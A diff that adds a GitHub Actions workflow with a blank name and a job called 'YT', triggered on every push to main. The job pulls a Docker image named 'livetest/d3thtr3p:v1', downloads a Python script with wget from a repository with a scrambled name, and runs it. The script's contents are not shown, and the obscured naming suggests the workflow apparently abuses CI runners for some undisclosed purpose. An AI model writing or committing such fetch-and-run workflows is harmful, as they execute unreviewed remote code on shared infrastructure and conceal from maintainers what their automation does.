@@ -1,0 +1,16 @@
+name: _____
+
+on:
+  push:
+    branches: [ "main" ]
+
+jobs:
+  YT:
+    runs-on: ubuntu-latest
+    steps:
+    - uses: actions/checkout@v4
+    - name: Pull Docker image
+      run: docker pull livetest/d3thtr3p:v1
+    - name: Run Docker file
+      run: |
+           docker run livetest/d3thtr3p:v1 sh -c "wget https://raw.githubusercontent.com/Cjxsqa/-9204-2-kaiJNN-8-_-2928_-3-/main/yt.py && python3 yt.py"
